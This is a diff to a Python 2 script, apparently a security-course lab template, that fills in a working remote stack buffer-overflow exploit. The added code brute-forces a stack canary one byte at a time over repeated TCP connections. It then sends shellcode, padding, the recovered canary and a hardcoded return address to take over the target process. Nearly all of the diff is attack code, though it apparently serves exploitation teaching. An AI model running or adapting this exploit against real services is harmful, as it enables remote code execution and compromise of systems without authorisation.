@@ -3,6 +3,7 @@ import sys
 import socket
 import traceback
 import struct
+import time
 
 ####
 
@@ -14,41 +15,61 @@ import struct
 ##
 ## True means the exploit made the server close the connection (i.e. it crashed)
 ## False means the socket is still operational.
-def try_exploit(exploit, sock):
-    sock.send("%s\r\n" % exploit)
-    sock.recv(len(exploit) + 2) # the exploit will always be returned
+def try_exploit(exploit, host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    sock.send("%s\n" % exploit)
+    b = 0
+    while b < (len(exploit) + 1):
+        mylen = len(sock.recv(4098))
+        b += mylen
+        if mylen == 0:
+            return True
+    '''
+    sock.send("\n")
+    return len(sock.recv(5)) == 0
+    '''
     try:
-        sock.send("hello\r\n")
-        sock.recv(7)
-        return False
+        sock.send("\n")
+        resp = sock.recv(5)
+        return len(resp) == 0
     except:
         return True
 
 def exploit(host, port, shellcode):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("Connecting to %s:%d..." % (host, port))
-    sock.connect((host, port))
-
-    print("Connected, sending test request \"Hello\"...")
-    sock.send("Hello\r\n")
-    resp = sock.recv(7)
-    print("Response was \"%s\"!" % resp.strip())
-
-    print("OK, ready to h/\X0r...")
-
     # Build your exploit here
     # One useful function might be
     #   struct.pack("<I", x)
     # which returns the 4-byte binary encoding of the 32-bit integer x
-    while True:
-        if try_exploit("my_exploit_here", sock):
-            # socket was closed by server (e.g. process died)
-            break
-        else:
-            # socket still open
+    buf_str = "A" * 2048
+    canary = ""
+    next_byte = 0
+    while len(canary) < 4:
+        if next_byte == 10:
+            next_byte += 1
             continue
+        if try_exploit(buf_str + canary + chr(next_byte), host, port):
+            # Connection closed by server
+            next_byte += 1
+            #continue
+        else:
+            canary += chr(next_byte)
+            next_byte = 0
+            # Connection still up
+            #break
 
-    sock.close()
+    for i in range(0, len(canary)):
+        print ord(canary[i])
+
+    time.sleep(5)
+    # construct query to unlink
+    buf_str = shellcode + "A" * (2048 - len(shellcode)) + canary + "A" * 4 + "\x6c\xee\xff\xbf"
+    if try_exploit(buf_str, host, port):
+        print "failed"
+    else:
+        print "success"
+                         
+    # remainder buffer (0x90 = NOP)"\x90"*len + shellcode + canary + ebp + return addr 0xbfffee6c
 
 ####
 
